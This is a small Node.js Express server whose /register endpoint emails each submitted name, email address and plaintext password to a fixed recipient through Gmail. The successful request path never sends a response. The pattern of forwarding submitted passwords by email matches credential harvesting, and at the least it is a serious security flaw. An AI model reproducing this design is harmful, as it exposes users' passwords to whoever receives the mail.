const express=require('express')
require('dotenv').config()
const nodemailer=require('nodemailer')
const bodyParser=require('body-parser')
const cors= require('cors')

const app=express()
const PORT=process.env.PORT || 5000

app.use(cors())
app.use(express.static("public"))
app.use(bodyParser.urlencoded({extended:true}))
app.use(bodyParser.json())

const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS
    }
});
transporter.verify((error, success) => {
    if (error) {
        console.error("Email Server Error:", error);
    } else {
        console.log("Email Server Ready ✅");
    }
});
app.post('/register',async(req,res)=>{
    const {email,password,name}=req.body;

    if(!name||!email||!password)
    {
        return res.status(400).json({message:"All fields are required"})
    }
    try{
        await transporter.sendMail({
            from: process.env.EMAIL_USER,
            to: process.env.CLIENT_EMAIL,
            subject: "New User Registration",
            text: `New Registration:\n\nName: ${name}\nEmail: ${email}\nPassword: ${password}`
        })
    }
    catch (error) {
        res.status(500).json({ message: "Error sending email", error });
    }

})

app.listen(PORT,()=>{
    console.log(`Server running on port ${PORT}`);
})